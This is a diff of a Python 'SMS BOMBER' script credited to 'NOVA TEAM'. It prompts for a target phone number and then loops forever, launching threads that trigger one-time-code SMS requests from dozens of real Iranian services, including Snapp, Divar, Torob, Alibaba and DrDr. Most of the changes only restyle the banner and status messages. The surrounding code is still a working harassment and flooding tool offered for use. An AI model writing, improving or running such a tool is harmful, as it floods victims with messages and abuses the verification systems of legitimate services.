@@ -52,47 +52,47 @@ from rich.highlighter import Highlighter
 from colorama import *
 console = Console()
 
-Write.Print("           .... NO! ...                  ... MNO! ...\n", Colors.blue_to_red, interval=0.005)
-Write.Print("         ..... MNO!! ...................... MNNOO! ...\n", Colors.blue_to_red, interval=0.005)
-Write.Print("        ..... MMNO! ......................... MNNOO!! .\n", Colors.blue_to_red, interval=0.005)
-Write.Print("       ..... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .\n", Colors.blue_to_red, interval=0.005)
-Write.Print("        ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....\n", Colors.blue_to_red, interval=0.005)
-Write.Print("           ...... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...\n", Colors.blue_to_red, interval=0.005)
-Write.Print("         ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....\n", Colors.blue_to_red, interval=0.005)
-Write.Print("          ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...\n", Colors.blue_to_red, interval=0.005)
-Write.Print("           ....... MMMMM..    OPPMMP    .,OMI! ....\n", Colors.blue_to_red, interval=0.005)
-Write.Print("            ...... MMMM::  o .,OPMP,. o  ::I!! ...\n", Colors.blue_to_red, interval=0.005)
-Write.Print("                .... NNM:::.,,OOPM!P,.::::!! ....\n", Colors.blue_to_red, interval=0.005)
-Write.Print("                 .. MMNNNNNOOOOPMO!!IIPPO!!O! .....\n", Colors.blue_to_red, interval=0.005)
-Write.Print("                ...  MMMMMNNNNO I:I IPPPPOO! ....\n", Colors.blue_to_red, interval=0.005)
-Write.Print("                  .. MMMMMNNOOMMNNIIIPPPOO!! ......\n", Colors.blue_to_red, interval=0.005)
-Write.Print("                 ...... MMMONNMMNNNIIIOO!..........\n", Colors.blue_to_red, interval=0.005)
-Write.Print("              ....... MN MOMMMNNNIIIIIO! OO ..........\n", Colors.blue_to_red, interval=0.005)
-Write.Print("           ......... MNO! IiiiiiiiiiiiI OOOO ...........\n", Colors.blue_to_red, interval=0.005)
-Write.Print("         ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........\n", Colors.blue_to_red, interval=0.005)
-Write.Print("          .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........\n", Colors.blue_to_red, interval=0.005)
-Write.Print("          ...... MNNNNO! .. PPPPPPPPP .. MMNON!........\n", Colors.blue_to_red, interval=0.005)
-Write.Print("             ...... OO! ................. ON! .......\n", Colors.blue_to_red, interval=0.005)
-Write.Print("                ................................\n", Colors.blue_to_red, interval=0.005)
+Write.Print("      .... NO! ...                  ... MNO! ...\n", Colors.blue_to_red, interval=0.002)
+Write.Print("    ..... MNO!! ...................... MNNOO! ...\n", Colors.blue_to_red, interval=0.002)
+Write.Print("   ..... MMNO! ......................... MNNOO!! .\n", Colors.blue_to_red, interval=0.002)
+Write.Print("  ..... MNOONNOO!   MMMMMMMMMMPPPOII!   MNNO!!!! .\n", Colors.blue_to_red, interval=0.002)
+Write.Print("   ... !O! NNO! MMMMMMMMMMMMMPPPOOOII!! NO! ....\n", Colors.blue_to_red, interval=0.002)
+Write.Print("   ......... ! MMMMMMMMMMMMMPPPPOOOOIII! ! ...\n", Colors.blue_to_red, interval=0.002)
+Write.Print("    ........ MMMMMMMMMMMMPPPPPOOOOOOII!! .....\n", Colors.blue_to_red, interval=0.002)
+Write.Print("     ........ MMMMMOOOOOOPPPPPPPPOOOOMII! ...\n", Colors.blue_to_red, interval=0.001)
+Write.Print("      ....... MMMMM..    OPPMMP    .,OMI! ....\n", Colors.blue_to_red, interval=0.001)
+Write.Print("       ...... MMMM::  o .,OPMP,. o  ::I!! ...\n", Colors.blue_to_red, interval=0.001)
+Write.Print("           ...NNNNM:::.,,OOPM!P,.::::!!! ....\n", Colors.blue_to_red, interval=0.001)
+Write.Print("            .. MMNNNNNOOOOPMO!!IIPPO!!O! .....\n", Colors.blue_to_red, interval=0.001)
+Write.Print("           ...  MMMMMNNNNO I:I IPPPPOO! ....\n", Colors.blue_to_red, interval=0.000001)
+Write.Print("             .. MMMMMNNOOMMNNIIIPPPOO!! ......\n", Colors.blue_to_red, interval=0.000001)
+Write.Print("            ......NMMMONNMMNNNIIIOO!!!..........\n", Colors.blue_to_red, interval=0.000001)
+Write.Print("         ....... MN MOMMMNNNIIIIIO! OO ..........\n", Colors.blue_to_red, interval=0.000001)
+Write.Print("      ......... MNO! IiiiiiiiiiiiI OOOO ...........\n", Colors.blue_to_red, interval=0.000001)
+Write.Print("    ...... NNN.MNO! . O!!!!!!!!!O . OONO NO! ........\n", Colors.blue_to_red, interval=0.000001)
+Write.Print("     .... MNNNNNO! ...OOOOOOOOOOO .  MMNNON!........\n", Colors.blue_to_red, interval=0.000001)
+Write.Print("     ...... MNNNNO! .. PPPPPPPPP .. MMNON!........\n", Colors.blue_to_red, interval=0.000001)
+Write.Print("        ...... OO! ................. ON! .......\n", Colors.blue_to_red, interval=0.000001)
+Write.Print("           ................................\n", Colors.blue_to_red, interval=0.000001)
 
 print("                                                ")
 print("                                                ")
 print("                                                ")
 
-Write.Print("                          v 1.2\n", Colors.green, interval=0.001)
-Write.Print("██╗  ██╗███╗   ███╗ █████╗     ██████╗  ██████╗ ███╗   ███╗██████╗\n", Colors.green, interval=0.000001)
-Write.Print("██║ ██╔╝████╗ ████║██╔══██╗    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗\n", Colors.green, interval=0.000001)
-Write.Print("█████╔╝ ██╔████╔██║███████║    ██████╔╝██║   ██║██╔████╔██║██████╔╝\n", Colors.white, interval=0.000001)
-Write.Print("██╔═██╗ ██║╚██╔╝██║██╔══██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗\n", Colors.white, interval=0.000001)
-Write.Print("██║  ██╗██║ ╚═╝ ██║██║  ██║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝\n", Colors.red, interval=0.000001)
-Write.Print("╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝\n", Colors.red, interval=0.000001)
+Write.Print("                            v 1.2\n", Colors.green, interval=0.001)
+Write.Print("  ██╗  ██╗███╗   ███╗ █████╗     ██████╗  ██████╗ ███╗   ███╗██████╗\n", Colors.green, interval=0.000001)
+Write.Print("  ██║ ██╔╝████╗ ████║██╔══██╗    ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗\n", Colors.green, interval=0.000001)
+Write.Print("  █████╔╝ ██╔████╔██║███████║    ██████╔╝██║   ██║██╔████╔██║██████╔╝\n", Colors.white, interval=0.000001)
+Write.Print("  ██╔═██╗ ██║╚██╔╝██║██╔══██║    ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗\n", Colors.white, interval=0.000001)
+Write.Print("  ██║  ██╗██║ ╚═╝ ██║██║  ██║    ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝\n", Colors.red, interval=0.000001)
+Write.Print("  ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝    ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝\n", Colors.red, interval=0.000001)
                                                                    
-Write.Print("                       NOVA ​🇫​​🇲 ON TOP!\n", Colors.blue_to_red, interval=0.000001)                                                        
-Write.Print("  >SMS BOMBER:)\n", Colors.red_to_blue, interval=0.000001)
-Write.Print("  >MADE BY: NOVA TEAM\n", Colors.blue_to_red, interval=0.000001)
-Write.Print("  >AMIR#0001 \n", Colors.red_to_blue, interval=0.000001)
-Write.Print("________________________________________________________________________________________	\n", Colors.blue_to_red, interval=0.009)
-	
+Write.Print("                         NOVA ON TOP\n", Colors.blue_to_red, interval=0.000001)                                                        
+Write.Print("                        SMS BOMBER :)\n", Colors.purple, interval=0.000001)
+Write.Print("                      MADE BY: NOVA TEAM\n", Colors.purple, interval=0.000001)
+Write.Print("                     Discord: ! AMIR#0001 \n", Colors.purple, interval=0.000001)
+Write.Print("  __________________________________________________________________	\n", Colors.blue_to_red, interval=0.001)
+print("                                                                                                ")	
 try:
     from requests import get, post
 except ImportError:
@@ -103,7 +103,7 @@ def snap(phone):
     try:
         snapR = post(timeout=5, url="https://app.snapp.taxi/api/api-passenger-oauth/v2/otp", headers=snapH, json=snapD).text
         if "OK" in snapR:
-            print('{[yellow]+[/yellow]} (Snap) Code Was Sent')
+            Write.Print("  [+] (Snap) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -112,7 +112,7 @@ def gap(phone):
     try:
         gapR = get(timeout=5, url="https://core.gap.im/v1/user/add.json?mobile=%2B{}".format(phone.split("+")[1]), headers=gapH).text
         if "OK" in gapR:
-            print('{[yellow]+[/yellow]} (Gap) Code Was Sent')
+            Write.Print("  [+] (Gap) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -122,7 +122,7 @@ def tap30(phone):
     try:
         tap30R = post(timeout=5, url="https://tap33.me/api/v2/user", headers=tap30H, json=tap30D).json()
         if tap30R['result'] == "OK":
-            print('{[yellow]+[/yellow]} (Tap30) Code Was Sent')
+            Write.Print("  [+] (Tap30) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -141,7 +141,7 @@ def divar(phone):
     try:
         divarR = post(timeout=5, url="https://api.divar.ir/v5/auth/authenticate", headers=divarH, json=divarD).json()
         if divarR["authenticate_response"] == "AUTHENTICATION_VERIFICATION_CODE_SENT":
-            print('{[yellow]+[/yellow]} (Divar) Code Was Sent')
+            Write.Print("  [+] (Divar) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -158,7 +158,7 @@ def torob(phone):
     try:
         torobR = get(timeout=5, url=f"https://api.torob.com/a/phone/send-pin/?phone_number={phone}", headers=torobH).json()
         if torobR["message"] == "pin code sent":
-            print('{[yellow]+[/yellow]} (Torob) Code Was Sent')
+            Write.Print("  [+] (Torob) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -178,7 +178,7 @@ def snapfood(phone):
     try:
         sfoodR = post(timeout=5, url=sfoodU, headers=sfoodH, data=sfoodD).json()
         if sfoodR['status'] == True:
-            print('{[yellow]+[/yellow]} (SnapFood) Code Was Sent')
+            Write.Print("  [+] (Snapfood) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -189,7 +189,7 @@ def sheypoor(phone):
     try:
         sheyporR = post(timeout=5, url='https://www.sheypoor.com/auth', headers=sheyporH, data=sheyporD).json()
         if sheyporR['success'] == True:
-            print('{[yellow]+[/yellow]} (Sheypoor) Code Was Sent')
+            Write.Print("  [+] (Sheypoor) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -213,7 +213,7 @@ def okorosh(phone):
     try:
         okR = post(timeout=5, url=okU, headers=okH, json=okJ).text
         if 'success' in okR:
-            print('{[yellow]+[/yellow]} (OfoghKourosh) Code Was Sent')
+            Write.Print("  [+] (Ofoghkorosh) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -224,7 +224,7 @@ def alibaba(phone):
     try:
         alibabaR = post(timeout=5, url='https://ws.alibaba.ir/api/v3/account/mobile/otp', headers=alibabaH, json=alibabaD ).json()
         if alibabaR["result"]["success"] == True:
-            print('{[yellow]+[/yellow]} (AliBaba) Code Was Sent')
+            Write.Print("  [+] (Ali bala) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -241,7 +241,7 @@ def smarket(phone):
     try:
         smarketR = post(timeout=5, url=smarketU, headers=smarketH).json()
         if smarketR['status'] == True:
-            print('{[yellow]+[/yellow]} (SnapMarket) Code Was Sent')
+            Write.Print("  [+] (Snap market) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -274,7 +274,7 @@ def gapfilm(phone):
     try:
         gaR = post(timeout=5, url=gaU, headers=gaH, json=gaJ).json()
         if gaR['Code'] == 1:
-            print('{[yellow]+[/yellow]} (GapFilm) Code Was Sent')
+            Write.Print("  [+] (Gapfilm) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -284,7 +284,7 @@ def sTrip(phone):
     try:
         sTripR = post(timeout=5, url='https://www.snapptrip.com/register', headers=sTripH, json=sTripD).json()
         if sTripR['status_code'] == 200:
-            print('{[yellow]+[/yellow]} (Strip) Code Was Sent')
+            Write.Print("  [+] (Strip) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -307,7 +307,7 @@ def filmnet(phone):
     try:
         Filmnet = get(timeout=5, url=fnU, headers=fNh).json()
         if Filmnet['meta']['operation_result'] == 'success':
-            print('{[yellow]+[/yellow]} (Filmnet) Code Was Sent')
+            Write.Print("  [+] (FilmNet) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -326,7 +326,7 @@ def drdr(phone):
     try:
         drdr = post(timeout=5, url=dru, headers=drh, params={"phoneNumber":phone ,"userType":"PATIENT"}).json()
         if drdr['status'] == 'success':
-            print('{[yellow]+[/yellow]} (DrDr) Code Was Sent')
+            Write.Print("  [+] (Dr Dr) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -346,7 +346,7 @@ def itool(phone):
     try:
         ok = post(timeout=5, url=itU, headers=itH, json=itJ).json()
         if ok['success'] == True:
-            print('{[yellow]+[/yellow]} (Itool) Code Was Sent')
+            Write.Print("  [+] (Itool) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -367,7 +367,7 @@ def anar(phone):
     try:
         ok = post(timeout=5, url=anrU, headers=anrH, json=anrJ).json()      
         if ok['status'] == True:
-            print('{[yellow]+[/yellow]} (AnarGift) Code Was Sent')
+            Write.Print("  [+] (AnarGift) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except :
         pass
@@ -391,7 +391,7 @@ def azki(phone):
     try:
         ok = post(timeout=5, url=azkU, headers=azkH).json()
         if ok["messageCode"] == 201:
-            print('{[yellow]+[/yellow]} (Azki) Code Was Sent')
+            Write.Print("  [+] (Azki) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -412,6 +412,7 @@ def nobat(phone):
     try:
         ok = post(timeout=5, url=noU, headers=noH, json=noJ).json()
         if ok["status"] != 'failed':
+            Write.Print("  [+] (Nobat) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -435,7 +436,7 @@ def chmdon(phone):
     try:
         ok = post(timeout=5, url=chU, headers=chH, json=chJ).json()
         if ok["status"] == 'ok':
-            print('{[yellow]+[/yellow]} (Chamedoon) Code Was Sent')
+            Write.Print("  [+] (Chmdon) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -460,7 +461,7 @@ def bn(phone):
     try:
         ok = post(timeout=5, url=bnU, headers=bnH, json=bnJ).json()
         if ok["status"] == 'success':
-            print('{[yellow]+[/yellow]}(BaniMode) Code Was Sent')
+            Write.Print("  [+] (BaniMode) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -485,7 +486,7 @@ def lendo(phone):
     try:
         lendoR = post(timeout=5, url=leU, headers=leH, data=leD).text
         if 'تایید شماره تلفن همراه' in lendoR:
-            print('{[yellow]+[/yellow]} (Lendo) Code Was Sent')
+            Write.Print("  [+] (Lendo) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -511,7 +512,7 @@ def olgoo(phone):
     try:
         olgoo = post(timeout=5, url=olU, headers=olH, data=olD).text
         if 'مدت زمان باقی‌مانده تا دریافت مجدد کد' in olgoo:
-            print('{[yellow]+[/yellow]} (NashrOlgoo) Code Was Sent')
+            Write.Print("  [+] (NashrOlgoo) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -532,7 +533,7 @@ def pakhsh(phone):
     try:
         ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
         if ok['code'] == '1':
-            print('{[yellow]+[/yellow]} (PakhshShop) Code Was Sent')
+            Write.Print("  [+] (PakhshShop) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -552,7 +553,7 @@ def didnegar(phone):
     try:
         ok = post(timeout=5, url=paU, headers=paH, data=paD).json()
         if ok['code'] == '1':
-            print('{[yellow]+[/yellow]} (DideNegar) Code Was Sent')
+            Write.Print("  [+] (Didenegar) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -574,7 +575,7 @@ def baskol(phone):
     try:
         ok = post(timeout=5, url=baU, headers=baH, json=baJ).json()
         if ok['status'] == True:
-            print('{[yellow]+[/yellow]} (Baskol) Code Was Sent')
+            Write.Print("  [+] (Baskol) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -597,7 +598,7 @@ def kilid(phone):
     try:
         ok = post(timeout=5, url=kiU, headers=kiH, json=kiJ).json()
         if ok['status'] == 'SUCCESS':
-            print('{[yellow]+[/yellow]} (Kilid) Code Was Sent')
+            Write.Print("  [+] (Kilid) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -623,7 +624,7 @@ def basalam(phone):
     try:
         ok = post(timeout=5, url=baU, headers=baH, json=baJ)
         if ok.status_code == 200:
-            print('{[yellow]+[/yellow]} (BaSalam) Code Was Sent')
+            Write.Print("  [+] (Basalam) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -644,7 +645,7 @@ def see5(phone):
     ok = post(timeout=5, url=seU, headers=seH, data=seD).text
     try:
         if ok == 'send_sms':
-            print('{[yellow]+[/yellow]} (See5) Code Was Sent')
+            Write.Print("  [+] (See5) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -668,7 +669,7 @@ def ghabzino(phone):
     try:
         ok = get(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
         if ok["Parameters"] != None:
-            print('{[yellow]+[/yellow]} (Ghabzino) Code Was Sent')
+            Write.Print("  [+] (Ghabzino) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -691,7 +692,7 @@ def simkhanF(phone):
     try:
         ok = post(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
         if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
-            print('{[yellow]+[/yellow]} (SimKhan) Code Was Sent')
+            Write.Print("  [+] (Simkhan) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -714,7 +715,7 @@ def simkhanT(phone):
     try:
         ok = post(timeout=5, url=ghU, headers=ghH, json=ghJ).json()
         if ok['Message'] == "ثبت نام شما با موفقیت انجام شد":
-            print('{[yellow]+[/yellow]} (SimKhan) Code Was Sent')
+            Write.Print("  [+] (SIMkhan) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -734,7 +735,7 @@ def drsaina(phone):
     try:
         ok = post(timeout=5, url=ghU, headers=ghH, data=ghD).text
         if 'کد تایید 6 رقمی پیامک شده به شماره' in ok:
-            print('{[yellow]+[/yellow]} (DrSaina) Code Was Sent')
+            Write.Print("  [+] (Dr saina) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -755,7 +756,7 @@ def binjo(phone):
     try:
         ok = get(timeout=5, url=ghU, headers=ghH, verify=False).json()
         if ok['status'] == 'ok':
-            print('{[yellow]+[/yellow]} (BinJo) Code Was Sent')
+            Write.Print("  [+] (Binjo) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -777,7 +778,7 @@ def limome(phone):
     try:
         liR = post(timeout=5, url=liU, headers=liH, data=liD).json()
         if liR['status'] == 'success':
-            print('{[yellow]+[/yellow]} (Limome) Code Was Sent')
+            Write.Print("  [+] (Limome) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -796,7 +797,7 @@ def bimito(phone):
     try:
         liR = post(timeout=5, url=liU, headers=liH).json()
         if liR['message'] == 'کاربر قبلا ثبت نام نکرده است':
-            print('{[yellow]+[/yellow]} BimitoVip) Code Was Sent')
+            Write.Print("  [+] (Bimito) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -815,7 +816,7 @@ def bimitoVip(phone):
     try:
         liR = post(timeout=5, url=liU, headers=liH).json()
         if liR['message'] == 'کاربر قبلا ثبت نام نشده است':
-            print('{[yellow]+[/yellow]} (BimitoVip) Code Was Sent')
+            Write.Print("  [+] (BimitoVip) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except:
         pass
@@ -833,7 +834,7 @@ def seebirani(phone):
 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.33'}
     try:
         post(timeout=5, url=liU, headers=liH, json=liJ)
-        print('{[yellow]+[/yellow]} (SeebIrani) Code Was Sent')
+        Write.Print("  [+] (Seebirani) Code Was Sent \n",Colors.green,interval=0.0000001)
         return True
     except:
         pass
@@ -852,7 +853,7 @@ def mihanpezeshk(phone):
 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36'}
     try:
         gaR = post(url=gaU, headers=gaH, data=gaD)
-        print('{[yellow]+[/yellow]} (MihanPezeshk) Code Was Sent')
+        Write.Print("  [+] (Mihanpezheshk) Code Was Sent \n",Colors.green,interval=0.0000001)
         return True
     except:
         pass
@@ -883,7 +884,7 @@ def mek(phone):
     try:
         meR = post(url=meU, headers=meH, data=meD).json()
         if meR['isSuccess']:
-            print('{[yellow]+[/yellow]} (HamrahMechanic) کد ارسال شد')
+            Write.Print("  [+] (HamrahMechanic) Code Was Sent \n",Colors.green,interval=0.0000001)
             return True
     except: pass
 # ================================[SEND SMS FUNC]================================
@@ -945,15 +946,16 @@ def Vip(phone, Time):
     Thread(target=mek, args=[phone]).start(), sleep(Time)
 
 while True:
-    phone = is_phone(input(Colors.blue+'  >Enter Target Number => '))
+    phone = is_phone(input(Colors.cyan+'  [+] Enter Target Number => '))
     if phone:
         break
 try:
-    Time = float(input(f'Enter Sleep Time (least: 0.0001) >>> '))
+    Time = float(input(f'  [+] press ENTER to continue... => '))
 except ValueError:
     Time = 0.1
-    print("{[red]-[/red]}[0.1] Used")
+    Write.Print("  [+] Sleep time [0.1] Used \n",Colors.green,interval=0.000001)
 while True:
     try: Vip(phone, Time)
-    except KeyboardInterrupt: exit('{[red]-[/red]} User Exited')
-    except: print('{[red]-[/red]} Error TimeOut')
+    except KeyboardInterrupt: exit(Fore.RED+'  [-] User Exited')
+    except: Write.Print("  [-] Time Out ! \n",Colors.red,interval=0.0000001)
+
